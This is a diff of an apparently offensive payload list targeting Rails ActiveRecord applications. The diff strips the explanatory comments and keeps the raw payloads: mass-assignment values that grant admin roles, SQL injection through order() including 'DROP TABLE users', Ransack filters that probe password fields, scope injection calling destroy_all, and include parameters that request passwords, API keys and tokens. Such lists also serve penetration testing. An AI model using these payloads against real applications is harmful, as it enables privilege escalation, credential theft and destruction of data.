@@ -1,24 +1,13 @@
-# ============================================================
-# ORM Leak — Rails ActiveRecord
-# ============================================================
-
-# ---- where() Hash Injection ----
-# If params passed directly: User.where(params[:user])
-# Payload in JSON or form:
 {"user": {"admin": true}}
 {"user": {"role": "admin"}}
 user[admin]=true
 user[role]=admin
 user[is_staff]=1
 
-# ---- SQL Injection via order() ----
-# User.order(params[:sort])
 ?sort=name ASC, (SELECT 1 FROM users WHERE admin=1)--
 ?sort=id DESC; DROP TABLE users--
 ?sort=(CASE WHEN 1=1 THEN id ELSE name END)
 
-# ---- Ransack / Filtering Gem ----
-# Ransack exposes all model attributes by default:
 ?q[username_eq]=admin
 ?q[password_cont]=pass
 ?q[email_start]=admin
@@ -27,23 +16,14 @@ user[is_staff]=1
 ?q[created_at_gteq]=2020-01-01
 ?q[s]=admin+asc
 
-# ---- Scope Injection ----
-# If .send(params[:scope]) is used:
 ?scope=all
 ?scope=admin_users
 ?scope=destroy_all
 
-# ---- find_by() Injection ----
-# User.find_by(params[:search])
 {"admin": true}
 {"role": "admin"}
 search[admin]=true
 
-# ---- pluck() Column Extraction ----
-# Internal: User.pluck(:password, :api_key)
-# Look for bulk export endpoints that accept column names
-
-# ---- includes() N+1 Disclosure ----
 ?include=password
 ?include=api_keys
 ?include=tokens
